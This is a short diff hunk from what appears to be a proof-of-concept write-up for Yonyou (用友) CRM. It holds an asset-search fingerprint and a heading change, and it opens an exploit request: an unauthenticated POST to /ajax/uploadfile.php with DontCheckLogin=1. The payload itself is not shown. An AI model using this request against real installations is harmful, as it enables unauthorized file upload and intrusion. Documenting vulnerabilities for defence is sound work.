@@ -6,7 +6,7 @@
 app.name="用友 CRM"
 ```
 
-## poc
+## POC
 
 ```yaml
 POST /ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1
